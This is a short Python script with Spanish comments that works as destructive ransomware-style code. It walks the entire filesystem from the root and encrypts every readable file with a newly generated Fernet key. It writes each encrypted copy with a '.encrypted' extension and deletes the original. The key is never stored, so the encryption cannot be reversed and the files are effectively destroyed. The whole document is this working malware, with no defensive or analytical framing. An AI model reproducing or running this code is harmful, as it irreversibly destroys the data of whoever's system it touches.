import os
from cryptography.fernet import Fernet

# Generar una clave de cifrado y crea una instancia de Fernet
key = Fernet.generate_key()
fernet = Fernet(key)

# Itera sobre cada archivo en el sistema de archivos
for dirpath, dirnames, filenames in os.walk("/"):
    for filename in filenames:
        filepath = os.path.join(dirpath, filename)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()

                # Cifra el contenido del archivo
                encrypted_data = fernet.encrypt(data)

                # Escribe los datos cifrados en un nuevo archivo con extensión .encrypted
                with open(filepath + ".encrypted", 'wb') as ef:
                    ef.write(encrypted_data)
                    print(f'File {filepath} encrypted successfully :)')

                # Borra el archivo original
                os.remove(filepath)
        except Exception as e:
            # Maneja cualquier excepcion (por ejemplo, permisos de archivos)
            print(f'Error while encrypting {filepath}: {e}')
